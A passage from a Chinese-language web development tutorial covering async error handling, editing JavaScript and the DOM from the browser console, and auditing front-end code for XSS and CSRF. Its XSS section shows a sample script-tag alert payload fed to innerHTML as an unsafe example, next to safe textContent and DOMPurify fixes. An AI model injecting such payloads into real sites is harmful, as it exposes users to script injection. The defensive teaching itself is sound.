<li><p>审查代码中是否使用了适当的错误处理机制，如在<code>await</code>前的异步调用没有使用<code>try-catch</code>捕获异常，可能导致错误不被处理。</p>
<p><strong>代码示例</strong>：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">js复制代码<span class="hljs-comment">// 不推荐：没有处理 Promise 的异常情况</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>);<br>  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;<br><br><span class="hljs-comment">// 推荐：使用 try-catch 捕获异常</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchDataWithHandling</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>);<br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Fetch error: &#x27;</span>, error);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>审计重点：</strong>检查异步操作是否妥善处理了异常情况，避免应用程序在发生错误时崩溃。</p>
</li>
</ul>
</li>
</ol>
<h3 id="修改变量和函数"><a href="#修改变量和函数" class="headerlink" title="修改变量和函数"></a>修改变量和函数</h3><h4 id="1-1-修改变量的值"><a href="#1-1-修改变量的值" class="headerlink" title="1.1 修改变量的值"></a>1.1 修改变量的值</h4><p>在控制台中，你可以直接修改已经声明的全局变量或局部变量的值。这种操作会立即生效，但仅限当前会话，刷新页面后会恢复初始状态。</p>
<p><strong>步骤：</strong></p>
<ol>
<li>打开控制台（按 <code>F12</code> 或 <code>Ctrl + Shift + I</code>）。</li>
<li>在控制台中找到你想修改的变量，直接输入代码修改它的值。</li>
</ol>
<p><strong>示例：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">html复制代码<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> message = <span class="hljs-string">&quot;Hello, World!&quot;</span>;</span><br><span class="language-javascript">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message);  <span class="hljs-comment">// 输出 &quot;Hello, World!&quot;</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>在控制台中输入以下代码来修改变量值：</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sas">javascript复制代码<span class="hljs-keyword">message</span> = <span class="hljs-string">&quot;Hello, Console!&quot;</span>;<br>console.<span class="hljs-meta">log</span>(<span class="hljs-keyword">message</span>);  // 输出 <span class="hljs-string">&quot;Hello, Console!&quot;</span><br></code></pre></td></tr></table></figure>

<h4 id="1-2-修改函数的行为"><a href="#1-2-修改函数的行为" class="headerlink" title="1.2 修改函数的行为"></a>1.2 修改函数的行为</h4><p>你可以重定义页面中的现有函数，从而修改其行为。控制台中的函数修改也只会在当前页面有效，刷新后恢复原始状态。</p>
<p><strong>步骤：</strong></p>
<ol>
<li>打开控制台。</li>
<li>通过重写函数来改变其行为。</li>
</ol>
<p><strong>示例：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">html复制代码<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello from original function!&quot;</span>);</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript">  <span class="hljs-title function_">greet</span>();  <span class="hljs-comment">// 输出 &quot;Hello from original function!&quot;</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>现在在控制台中输入以下代码重定义函数：</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">javascript复制代码greet = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Hello from modified function!&quot;</span>);<br>&#125;;<br>greet();  <span class="hljs-comment">// 输出 &quot;Hello from modified function!&quot;</span><br></code></pre></td></tr></table></figure>

<h3 id="二、修改-DOM-元素"><a href="#二、修改-DOM-元素" class="headerlink" title="二、修改 DOM 元素"></a>二、修改 DOM 元素</h3><p>控制台允许你动态操作页面的 DOM 元素，修改元素的内容、属性和样式。这是前端开发和调试中非常常用的功能。</p>
<h4 id="2-1-修改元素的内容"><a href="#2-1-修改元素的内容" class="headerlink" title="2.1 修改元素的内容"></a>2.1 修改元素的内容</h4><p>你可以选择页面上的任何 DOM 元素，并通过控制台修改它的内容。</p>
<p><strong>步骤：</strong></p>
<ol>
<li>在控制台中输入 <code>document.querySelector</code> 来选择页面元素。</li>
<li>使用 <code>.textContent</code> 或 <code>.innerHTML</code> 来修改元素的内容。</li>
</ol>
<p><strong>示例：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">html<br>复制代码<br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;heading&quot;</span>&gt;</span>Original Heading<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>在控制台中输入以下代码来修改标题内容：</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart">javascript<br>复制代码<br><span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;#heading&#x27;</span>).textContent = <span class="hljs-string">&#x27;Modified Heading&#x27;</span>;<br></code></pre></td></tr></table></figure>

<h4 id="2-2-修改元素的样式"><a href="#2-2-修改元素的样式" class="headerlink" title="2.2 修改元素的样式"></a>2.2 修改元素的样式</h4><p>你也可以直接通过控制台修改 HTML 元素的样式，来测试视觉效果。</p>
<p><strong>步骤：</strong></p>
<ol>
<li>通过控制台选择页面元素。</li>
<li>使用 <code>.style</code> 来修改元素的内联样式。</li>
</ol>
<p><strong>示例：</strong></p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">html<br>复制代码<br>&lt;p <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;paragraph&quot;</span>&gt;This <span class="hljs-keyword">is</span> a <span class="hljs-built_in">paragraph</span>.&lt;/p&gt;<br></code></pre></td></tr></table></figure>

<p>在控制台中输入以下代码来修改段落的颜色和字体大小：</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart">javascript复制代码let paragraph = <span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;#paragraph&#x27;</span>);<br>paragraph.style.color = <span class="hljs-string">&#x27;red&#x27;</span>;<br>paragraph.style.fontSize = <span class="hljs-string">&#x27;24px&#x27;</span>;<br></code></pre></td></tr></table></figure>

<h4 id="2-3-添加和删除-DOM-元素"><a href="#2-3-添加和删除-DOM-元素" class="headerlink" title="2.3 添加和删除 DOM 元素"></a>2.3 添加和删除 DOM 元素</h4><p>除了修改已有的 DOM 元素外，你还可以通过控制台添加或删除元素。</p>
<p><strong>步骤：</strong></p>
<ol>
<li>使用 <code>document.createElement</code> 创建新元素。</li>
<li>使用 <code>appendChild</code> 或 <code>removeChild</code> 来添加或删除元素。</li>
</ol>
<p><strong>示例：</strong> 在控制台中添加一个新的 <code>div</code> 元素到页面：</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">javascript复制代码let newDiv = document.createElement(<span class="hljs-symbol">&#x27;div</span>&#x27;);<br>newDiv.textContent = <span class="hljs-symbol">&#x27;This</span> <span class="hljs-keyword">is</span> a <span class="hljs-keyword">new</span> div!&#x27;;<br>document.<span class="hljs-keyword">body</span>.appendChild(newDiv);<br></code></pre></td></tr></table></figure>

<p>要删除该元素：</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">javascript<br>复制代码<br>document.body.removeChild(newDiv)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<h3 id="三、调试-JavaScript-代码"><a href="#三、调试-JavaScript-代码" class="headerlink" title="三、调试 JavaScript 代码"></a>三、调试 JavaScript 代码</h3><p>控制台不仅可以修改代码，还可以帮助你调试页面中的 JavaScript。常用的方法包括：</p>
<ol>
<li><strong>插入断点：</strong>你可以在代码执行的特定位置插入断点，并通过控制台监控变量的值和代码的执行流程。</li>
<li><strong>使用 <code>console.log</code> 追踪变量：</strong>通过在控制台中输出变量值，来追踪代码的执行和状态。</li>
</ol>
<h4 id="3-1-插入-console-log-进行调试"><a href="#3-1-插入-console-log-进行调试" class="headerlink" title="3.1 插入 console.log 进行调试"></a>3.1 插入 <code>console.log</code> 进行调试</h4><p>在控制台中你可以插入调试代码，比如<code>console.log</code>，来查看函数中的变量或输出信息，调试过程中常用。</p>
<p><strong>步骤：</strong></p>
<ol>
<li>在控制台中运行代码，监控某些关键变量。</li>
<li>使用 <code>console.log()</code> 输出信息。</li>
</ol>
<p><strong>示例：</strong></p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xquery">html复制代码<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-keyword">function</span> <span class="hljs-title function_">calculateSum</span>(<span class="hljs-params">a, b</span>) </span></span><span class="language-xquery">&#123;</span><br><span class="language-xquery">    <span class="hljs-keyword">let</span><span class="hljs-built_in"> sum</span> = a + b;</span><br><span class="language-xquery">    <span class="hljs-keyword">return</span><span class="hljs-built_in"> sum</span>;</span><br><span class="language-xquery">  &#125;</span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>

<p>在控制台中修改代码并添加调试信息：</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade">javascript复制代码<span class="hljs-keyword">function</span> <span class="hljs-title function_">calculateSum</span>(<span class="hljs-params">a, b</span>) &#123;<br>  let <span class="hljs-built_in">sum</span> = a + b;<br>  <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;The sum is:&#x27;</span>, <span class="hljs-built_in">sum</span>);  <span class="hljs-comment">// 输出 sum 值</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>;<br>&#125;<br>calculateSum(<span class="hljs-number">5</span>, <span class="hljs-number">10</span>);  <span class="hljs-comment">// 控制台中输出 &quot;The sum is: 15&quot;</span><br></code></pre></td></tr></table></figure>

<h4 id="3-2-插入断点调试"><a href="#3-2-插入断点调试" class="headerlink" title="3.2 插入断点调试"></a>3.2 插入断点调试</h4><p>通过 Chrome DevTools，你可以在 <code>Sources</code> 面板中为 JavaScript 文件设置断点，并通过控制台查看变量的状态，调试流程如下：</p>
<ol>
<li>打开 DevTools，点击 <code>Sources</code> 面板。</li>
<li>打开包含 JavaScript 代码的文件。</li>
<li>点击行号设置断点。</li>
<li>刷新页面或触发代码执行，程序将在断点处暂停，此时可以在控制台中检查变量值。</li>
</ol>
<h3 id="四、临时注入新代码"><a href="#四、临时注入新代码" class="headerlink" title="四、临时注入新代码"></a>四、临时注入新代码</h3><p>你可以在控制台中临时注入新代码，比如为按钮添加新的点击事件，修改页面的交互逻辑。</p>
<h4 id="4-1-添加事件监听器"><a href="#4-1-添加事件监听器" class="headerlink" title="4.1 添加事件监听器"></a>4.1 添加事件监听器</h4><p><strong>步骤：</strong></p>
<ol>
<li>使用 <code>addEventListener</code> 为页面中的元素添加事件。</li>
<li>在控制台中注入该代码，点击按钮时会执行新添加的事件处理程序。</li>
</ol>
<p><strong>示例：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">html<br>复制代码<br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myButton&quot;</span>&gt;</span>Click Me<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>在控制台中为按钮添加点击事件：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">javascript复制代码<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#myButton&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Button clicked!&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<p>点击按钮时，将弹出一个提示框。</p>
<h3 id="五、查看和修改-JavaScript-对象"><a href="#五、查看和修改-JavaScript-对象" class="headerlink" title="五、查看和修改 JavaScript 对象"></a>五、查看和修改 JavaScript 对象</h3><p>在控制台中可以查看 JavaScript 对象的详细信息，并动态修改对象的属性和方法。</p>
<h4 id="5-1-查看对象的结构"><a href="#5-1-查看对象的结构" class="headerlink" title="5.1 查看对象的结构"></a>5.1 查看对象的结构</h4><p>使用 <code>console.dir()</code> 来查看 JavaScript 对象的详细结构。</p>
<p><strong>步骤：</strong></p>
<ol>
<li>在控制台中使用 <code>console.dir()</code>。</li>
<li>通过点击展开查看对象的所有属性和方法。</li>
</ol>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">javascript复制代码<span class="hljs-keyword">let</span> person = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>, <span class="hljs-attr">job</span>: <span class="hljs-string">&#x27;Developer&#x27;</span> &#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">dir</span>(person);<br></code></pre></td></tr></table></figure>

<h4 id="5-2-修改对象属性"><a href="#5-2-修改对象属性" class="headerlink" title="5.2 修改对象属性"></a>5.2 修改对象属性</h4><p>你可以通过控制台直接修改对象的属性。</p>
<p><strong>步骤：</strong></p>
<ol>
<li>通过控制台访问对象并修改其属性。</li>
<li>查看修改后的效果。</li>
</ol>
<p><strong>示例：</strong></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">javascript复制代码person.age = <span class="hljs-number">30</span>;<br>console.log(person);  // 输出 &#123;<span class="hljs-type">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>, age: <span class="hljs-number">30</span>, job: <span class="hljs-string">&#x27;Developer&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="六、临时修改网页中的-JavaScript-逻辑"><a href="#六、临时修改网页中的-JavaScript-逻辑" class="headerlink" title="六、临时修改网页中的 JavaScript 逻辑"></a>六、临时修改网页中的 JavaScript 逻辑</h3><p>如果你想要临时修改网页中的 JavaScript 逻辑，可以通过在控制台中添加新的代码块来实现。</p>
<h4 id="6-1-注入新的逻辑"><a href="#6-1-注入新的逻辑" class="headerlink" title="6.1 注入新的逻辑"></a>6.1 注入新的逻辑</h4><p>你可以动态注入一段新的 JavaScript 代码来改变网页的行为，测试特定功能或行为。</p>
<p><strong>示例：</strong></p>
<p>假设页面有一个提交按钮，你想在提交之前增加额外的检查，可以这样做：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">javascript复制代码<span class="hljs-keyword">let</span> submitButton = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#submitButton&#x27;</span>);<br>submitButton.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#checkbox&#x27;</span>).<span class="hljs-property">checked</span>) &#123;<br>    event.<span class="hljs-title function_">preventDefault</span>();  <span class="hljs-comment">// 阻止提交</span><br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;You must agree to the terms!&#x27;</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在控制台中，你可以动态修改 JavaScript 代码、DOM 元素、事件处理程序以及对象属性。这种修改只在当前页面加载周期内有效，刷新页面后会恢复为原始状态。控制台提供了极大的灵活性，可以帮助你调试、测试和临时修改网页行为，同时也可以用于开发过程中快速验证想法。</p>
<p>JavaScript 的安全性审计是确保应用程序不会因为 JavaScript 的漏洞或不当使用而遭受攻击的关键环节。Web 应用程序的安全性很大程度上依赖于前端 JavaScript 代码的安全性，因为它直接与用户交互，同时处理输入、发起请求，并控制页面逻辑。通过安全性审计，可以发现潜在的安全漏洞，如跨站脚本攻击（XSS）、跨站请求伪造（CSRF）、点击劫持、代码注入等。</p>
<p>在 JavaScript 安全性审计中，主要从<strong>输入验证、安全编码实践、库和依赖的审计、前端存储和网络请求安全性</strong>等方面进行。以下将详细讲述如何对 JavaScript 代码进行全面的安全性审计。</p>
<hr>
<h3 id="一、输入验证"><a href="#一、输入验证" class="headerlink" title="一、输入验证"></a>一、输入验证</h3><p>JavaScript 的输入验证是审计的首要环节，因为不可信的用户输入是攻击的最常见来源。前端的输入验证应被视为<strong>第一道防线</strong>，但不能依赖其完全阻止攻击，后端必须同样严格验证输入。前端的输入验证主要用于提升用户体验、减少不必要的请求。</p>
<h4 id="1-1-前端输入验证检查"><a href="#1-1-前端输入验证检查" class="headerlink" title="1.1 前端输入验证检查"></a>1.1 前端输入验证检查</h4><ol>
<li><p><strong>缺失或不当的验证逻辑：</strong></p>
<ul>
<li>确保所有输入数据，包括表单、URL 参数、AJAX 请求、用户交互的文件或图片等，都进行了初步的验证。</li>
<li>检查是否有输入长度限制、字符类型限制（如仅接受数字或字母）、必填项等。</li>
</ul>
</li>
<li><p><strong>防止脚本注入：</strong></p>
<ul>
<li>防止用户通过输入恶意脚本来进行代码注入（如 XSS 攻击）。特别是<code>&lt;script&gt;</code>标签或类似的代码应被严格过滤。</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 不安全的处理方式：直接在页面中显示用户输入的内容</span><br><span class="hljs-keyword">let</span> userInput = <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;XSS Attack&#x27;);&lt;/script&gt;&quot;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = userInput;  <span class="hljs-comment">// XSS 攻击</span><br> <br><span class="hljs-comment">// 安全的做法：使用 textContent 插入纯文本，避免 XSS</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">textContent</span> = userInput;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>使用正则表达式进行输入过滤：</strong></p>
<ul>
<li>使用正则表达式对输入进行有效性检查，但确保正则表达式足够安全，不会引发拒绝服务攻击（ReDoS），即恶意用户通过构造复杂输入触发正则表达式的性能问题，导致服务器响应过慢甚至崩溃。</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">validateInput</span>(<span class="hljs-params">input</span>) &#123;<br>  <span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/^[a-zA-Z0-9]+$/</span>;  <span class="hljs-comment">// 仅允许字母和数字</span><br>  <span class="hljs-keyword">return</span> regex.<span class="hljs-title function_">test</span>(input);<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>防止HTML实体注入：</strong></p>
<ul>
<li>不允许用户在输入中插入 HTML 标签、实体等。可以使用库对输入进行 HTML 实体编码或过滤（例如<code>DOMPurify</code>）。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="二、跨站脚本攻击-XSS-防护"><a href="#二、跨站脚本攻击-XSS-防护" class="headerlink" title="二、跨站脚本攻击 (XSS) 防护"></a>二、跨站脚本攻击 (XSS) 防护</h3><p><strong>XSS</strong> 攻击是一种最常见的 Web 攻击类型，攻击者通过注入恶意 JavaScript 脚本，在其他用户的浏览器上执行。攻击者通常利用不安全的输入处理，将恶意代码注入到页面中，以窃取敏感信息（如 cookie、会话令牌）、劫持用户账户等。</p>
<h4 id="2-1-XSS-的类型"><a href="#2-1-XSS-的类型" class="headerlink" title="2.1 XSS 的类型"></a>2.1 XSS 的类型</h4><ol>
<li><p><strong>存储型 XSS</strong>：</p>
<ul>
<li>恶意脚本被存储在服务器端数据库中，每次当用户访问相关页面时，脚本会被执行。例如，攻击者通过留言板插入恶意脚本，当其他用户查看时，脚本执行。</li>
</ul>
</li>
<li><p><strong>反射型 XSS</strong>：</p>
<ul>
<li>恶意脚本被即时执行，通常嵌入在 URL 中。例如，通过欺骗用户点击一个恶意链接，该链接包含了攻击者的 JavaScript 代码，该代码会在用户浏览器中执行。</li>
</ul>
</li>
<li><p><strong>DOM 型 XSS</strong>：</p>
<ul>
<li>攻击者利用不安全的 JavaScript 操作来修改页面的 DOM 树，使恶意代码被注入并执行。这种攻击发生在客户端，无需与服务器交互。</li>
</ul>
</li>
</ol>
<h4 id="2-2-XSS-防护措施"><a href="#2-2-XSS-防护措施" class="headerlink" title="2.2 XSS 防护措施"></a>2.2 XSS 防护措施</h4><ol>
<li><p>**避免直接使用 <code>innerHTML</code> 或 <code>document.write()</code>**：</p>
<ul>
<li>避免直接将不可信的输入插入 DOM。应使用更安全的 <code>textContent</code> 或 <code>innerText</code>，将用户输入作为纯文本插入，而不是作为 HTML。</li>
</ul>
<p><strong>不安全的示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> userComment = <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;&quot;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = userComment;  <span class="hljs-comment">// 可能导致XSS</span><br></code></pre></td></tr></table></figure>

<p><strong>安全的替代方式：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">textContent</span> = userComment;  <span class="hljs-comment">// 安全</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>使用可信的库进行转义</strong>：</p>
<ul>
<li>使用库如 <code>DOMPurify</code> 对用户生成的内容进行清理和过滤，确保在插入 DOM 时已经移除了可能的恶意代码。</li>
<li>对所有输入都进行 HTML 转义，避免特殊字符（如 <code>&lt;</code> 和 <code>&gt;</code>）被解释为 HTML 代码。</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> sanitizedInput = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(userInput);<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = sanitizedInput;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>CSP（内容安全策略）</strong>：</p>
<ul>
<li>内容安全策略（CSP）是一种有效的 XSS 防护机制，它允许服务器指定浏览器只加载和执行来自可信源的 JavaScript 代码。通过设置严格的 CSP 头，可以防止页面加载和执行恶意脚本。</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;self&#x27;; style-src &#x27;self&#x27;;<br></code></pre></td></tr></table></figure></li>
</ol>
<hr>
<h3 id="三、跨站请求伪造-CSRF-防护"><a href="#三、跨站请求伪造-CSRF-防护" class="headerlink" title="三、跨站请求伪造 (CSRF) 防护"></a>三、跨站请求伪造 (CSRF) 防护</h3><p><strong>CSRF</strong> 是一种攻击手法，攻击者通过伪造受害者的身份，发送未经授权的请求。攻击的本质是利用了受害者的认证状态（如登录会话、Cookie），在未经用户同意的情况下，执行恶意操作。</p>
<h4 id="3-1-CSRF-攻击的防护措施"><a href="#3-1-CSRF-攻击的防护措施" class="headerlink" title="3.1 CSRF 攻击的防护措施"></a>3.1 CSRF 攻击的防护措施</h4><ol>
<li><p><strong>CSRF 令牌</strong>：</p>
<ul>
<li>每次用户发送请求时，服务器生成一个随机的 CSRF 令牌，并将其包含在表单或 AJAX 请求中。服务器验证该令牌的合法性，防止攻击者伪造请求。</li>
<li>在 JavaScript 中，确保请求时将 CSRF 令牌包含在请求的头部或表单中。</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;/api/submit&quot;</span>, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>  <span class="hljs-attr">headers</span>: &#123;<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>    <span class="hljs-string">&quot;CSRF-Token&quot;</span>: csrfToken  <span class="hljs-comment">// 包含CSRF令牌</span><br>  &#125;,<br>  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">data</span>: <span 